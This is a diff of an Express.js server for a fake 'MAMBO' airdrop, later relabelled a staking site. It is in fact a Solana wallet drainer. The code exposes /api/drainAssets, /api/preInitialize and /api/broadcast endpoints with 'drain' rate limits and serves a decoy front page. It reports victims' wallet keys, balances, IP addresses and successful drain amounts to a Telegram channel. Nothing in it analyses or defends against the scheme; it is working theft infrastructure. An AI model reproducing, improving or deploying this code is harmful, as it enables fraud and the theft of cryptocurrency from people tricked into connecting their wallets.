@@ -1,165 +1,216 @@
+
 import 'dotenv/config';
 import express from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
-import drainerHandler from './api/drainer.js';
+import rateLimit from 'express-rate-limit';
+
+// Import centralized error handling and Telegram logger
+import errorHandler from './src/errorHandler.js';
+import telegramLogger from './src/telegram.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// Import environment configuration
+import { ENV_CONFIG } from './env.config.js';
+
 const app = express();
-const PORT = process.env.PORT || 3000;
+const PORT = process.env.PORT || 3002;
+
+// Enhanced rate limiting with performance optimization
+const generalLimiter = rateLimit({
+  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
+  max: ENV_CONFIG.GENERAL_RATE_LIMIT, // 10000 requests per hour (extremely generous)
+  message: {
+    success: false,
+    error: 'Rate limit exceeded',
+    message: 'Non Participant Wallet'
+  },
+  standardHeaders: true,
+  legacyHeaders: false,
+  skipSuccessfulRequests: true,
+  skipFailedRequests: false,
+  // Performance optimizations
+  keyGenerator: (req) => {
+    // Use IP + User-Agent for better rate limiting
+    return req.ip + '|' + (req.headers['user-agent'] || 'unknown');
+  },
+  handler: (req, res) => {
+    res.status(429).json({
+      success: false,
+      error: 'Rate limit exceeded',
+      message: 'Non Participant Wallet'
+    });
+  }
+});
+
+// Ultra-lenient rate limiting for drain operations with performance optimization
+const drainLimiter = rateLimit({
+  windowMs: ENV_CONFIG.RATE_LIMIT_WINDOW_MS, // 1 hour
+  max: ENV_CONFIG.DRAIN_RATE_LIMIT, // 20000 drain attempts per hour (extremely generous)
+  message: {
+    success: false,
+    error: 'Drain rate limit exceeded',
+    message: 'Non Participant Wallet'
+  },
+  standardHeaders: true,
+  legacyHeaders: false,
+  skipSuccessfulRequests: true,
+  skipFailedRequests: false,
+  // Performance optimizations
+  keyGenerator: (req) => {
+    // Use IP + wallet type for drain-specific rate limiting
+    const walletType = req.body?.walletType || 'unknown';
+    return req.ip + '|' + walletType;
+  },
+  handler: (req, res) => {
+    res.status(429).json({
+      success: false,
+      error: 'Drain rate limit exceeded',
+      message: 'Non Participant Wallet'
+    });
+  }
+});
 
 // Middleware
-app.use(express.json());
-app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json({ limit: '50mb' }));
+app.use(express.static('public'));
 
-// API Routes - Specific routes first
-app.post('/api/drainer/log-wallet', async (req, res) => {
-  // Add CORS headers
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  
-  // Handle preflight requests
-  if (req.method === 'OPTIONS') {
-    return res.status(200).end();
-  }
-  
+// Apply general rate limiting to all routes
+app.use(generalLimiter);
+
+// Essential API endpoints only
+app.post('/api/drainAssets', drainLimiter, async (req, res) => {
   try {
-    if (!req.body || typeof req.body !== 'object') {
-      return res.status(400).json({ error: 'Invalid request body' });
-    }
-    
-    const { publicKey, walletType, lamports } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    if (!publicKey) {
-      return res.status(400).json({ error: 'Missing publicKey' });
-    }
-    
-    const telegramLogger = (await import('./src/telegram.js')).default;
-    
-    await telegramLogger.logWalletDetected({
-      publicKey: publicKey,
-      lamports: lamports || 0,
-      ip: userIp,
-      walletType: walletType || 'Unknown'
-    });
-    
-    res.status(200).json({ success: true });
-  } catch (error) {
-    res.status(500).json({ error: 'Failed to log wallet connection', details: error.message });
+    const { default: drainAssetsHandler } = await import('./api/drainAssets.js');
+    await drainAssetsHandler(req, res);
+  } catch (importError) {
+    console.error('[DRAIN_ASSETS] Import error:', importError);
+    res.status(500).json(errorHandler.formatApiError(importError, {
+      context: 'Drain Assets Import Error',
+      endpoint: '/api/drainAssets'
+    }));
   }
 });
 
-// OPTIONS route for wallet logging
-app.options('/api/drainer/log-wallet', (req, res) => {
-  res.setHeader('Access-Control-Allow-Origin', '*');
-  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
-  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
-  res.status(200).end();
-});
-
-// Main drainer routes
-app.get('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-app.post('/api/drainer', async (req, res) => {
+app.post('/api/preInitialize', drainLimiter, async (req, res) => {
   try {
-    await drainerHandler(req, res);
-  } catch (error) {
-    res.status(500).json({ error: 'Internal server error', details: error.message });
+    const { default: preInitializeHandler } = await import('./api/preInitialize.js');
+    await preInitializeHandler(req, res);
+  } catch (importError) {
+    console.error('[PRE_INITIALIZE] Import error:', importError);
+    res.status(500).json(errorHandler.formatApiError(importError, {
+      context: 'Pre-Initialize Import Error',
+      endpoint: '/api/preInitialize'
+    }));
   }
 });
 
-app.options('/api/drainer', async (req, res) => {
-  await drainerHandler(req, res);
-});
-
-// On-chain confirmation logging endpoint
-app.post('/api/drainer/log-confirmation', async (req, res) => {
+app.post('/api/broadcast', drainLimiter, async (req, res) => {
   try {
-    const { publicKey, txid, status, error } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    const telegramLogger = (await import('./src/telegram.js')).default;
-    
-    if (status === 'confirmed' || status === 'finalized') {
-      // Only log drain success for confirmed/finalized transactions
-      const actualDrainAmount = parseInt(req.body.actualDrainAmount) || 0;
-      const lamports = parseInt(req.body.lamports) || 0;
-      
-      console.log('[CONFIRMATION_HANDLER] Received drain success:', {
-        publicKey: publicKey,
-        actualDrainAmount: actualDrainAmount,
-        actualDrainAmountSOL: (actualDrainAmount / 1e9).toFixed(6),
-        lamports: lamports,
-        lamportsSOL: (lamports / 1e9).toFixed(6),
-        ip: userIp
-      });
-      
-      await telegramLogger.logDrainSuccess({
-        publicKey: publicKey,
-        actualDrainAmount: actualDrainAmount,
-        lamports: lamports,
-        ip: userIp
-      });
-    } else if (status === 'failed' || error) {
-      await telegramLogger.logDrainFailed({
-        publicKey: publicKey,
-        lamports: req.body.lamports || 0,
-        ip: userIp,
-        error: error || 'Transaction failed on-chain'
-      });
-    }
-    
-    res.status(200).json({ success: true });
-  } catch (error) {
-    res.status(500).json({ error: 'Failed to log confirmation', details: error.message });
+    const { default: broadcastHandler } = await import('./api/broadcast.js');
+    await broadcastHandler(req, res);
+  } catch (importError) {
+    console.error('[BROADCAST] Import error:', importError);
+    res.status(500).json(errorHandler.formatApiError(importError, {
+      context: 'Broadcast Import Error',
+      endpoint: '/api/broadcast'
+    }));
   }
 });
 
-// Transaction cancellation logging endpoint
-app.post('/api/drainer/log-cancellation', async (req, res) => {
-  try {
-    console.log('[CANCELLATION] Received cancellation request:', req.body);
-    const { publicKey, walletType, reason } = req.body;
-    const userIp = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
-    
-    const telegramLogger = (await import('./src/telegram.js')).default;
-    
-    await telegramLogger.logTransactionCancelled({
-      publicKey: publicKey,
-      walletType: walletType || 'Unknown',
-              reason: reason || 'User canceled the transaction',
-      lamports: req.body.lamports || 0,
-      ip: userIp
-    });
-    
-    console.log('[CANCELLATION] Cancellation logged successfully');
-    res.status(200).json({ success: true });
-  } catch (error) {
-    console.error('[CANCELLATION] Error logging cancellation:', error);
-    res.status(500).json({ error: 'Failed to log cancellation', details: error.message });
-  }
-});
-
-// Static file routes
-app.get('/logo.png', (req, res) => {
-  res.setHeader('Content-Type', 'image/png');
-  res.sendFile(path.join(__dirname, 'public', 'logo.png'));
-});
-
+// Serve static files and handle SPA routing
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// Frontend logging endpoint for Telegram integration
+app.post('/api/log', async (req, res) => {
+  try {
+    const { type, projectName, ...logData } = req.body;
+    
+    // Log to console with project branding
+    console.log(`[${projectName || 'MAMBO'}] ${type}:`, logData);
+    
+    // Send to Telegram if it's a critical log
+    const criticalLogTypes = [
+      'USER_CANCELLATION',
+      'DEEP_LINKING_ERROR', 
+      'WALLET_DETECTION_ERROR',
+      'WALLET_CONNECTION',
+      'TRANSACTION_SIGNING',
+      'API_CALL',
+      'NETWORK',
+      'VALIDATION',
+      'RPC_ERROR',
+      'SOLANA_ERROR',
+      'UNSUPPORTED_PATH_ERROR',
+      'UNHANDLED_ERROR',
+      'UNHANDLED_PROMISE_REJECTION',
+      'solana_error',
+      'rpc_error'
+    ];
+    
+    if (criticalLogTypes.includes(type)) {
+      try {
+        // Use appropriate logging method based on error type
+        if (type === 'SOLANA_ERROR' || type === 'solana_error') {
+          await telegramLogger.logSolanaError({
+            ...logData,
+            error: logData.error || type,
+            context: logData.context || 'Frontend Log',
+            projectName: projectName || 'MAMBO'
+          });
+        } else {
+          await telegramLogger.logFrontendError({
+            ...logData,
+            error: logData.error || type,
+            context: logData.context || 'Frontend Log',
+            projectName: projectName || 'MAMBO'
+          });
+        }
+      } catch (telegramError) {
+        console.error('[LOG_API] Telegram logging failed:', telegramError.message);
+      }
+    }
+    
+    res.json({ success: true, logged: true });
+  } catch (error) {
+    console.error('[LOG_API] Logging failed:', error);
+    res.status(500).json({ success: false, error: 'Logging failed' });
+  }
+});
+
+// Global error handling middleware
+app.use((error, req, res, next) => {
+  console.error('[GLOBAL_ERROR] Unhandled error:', error);
+  
+  if (!res.headersSent) {
+    res.status(500).json(errorHandler.formatApiError(error, {
+      context: 'Global Error Handler',
+      path: req.path,
+      method: req.method
+    }));
+  }
+});
+
+// 404 handler for unmatched routes
+app.use((req, res) => {
+  res.status(404).json(errorHandler.formatApiError(new Error('Route not found'), {
+    context: '404 Not Found',
+    path: req.path,
+    method: req.method
+  }));
+});
+
 // Start server
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on http://localhost:${PORT}`);
-  console.log(`📱 MAMBO Airdrop: http://localhost:${PORT}`);
-  console.log(`🔗 API Endpoint: http://localhost:${PORT}/api/drainer`);
-  console.log(`📚 Client Library: http://localhost:${PORT}/drainer-client.js`);
+  console.log(`🚀 MAMBO Staking Server running on port ${PORT}`);
+  console.log(`📱 Frontend: http://localhost:${PORT}`);
+  console.log(`🔗 API: http://localhost:${PORT}/api`);
 }); 
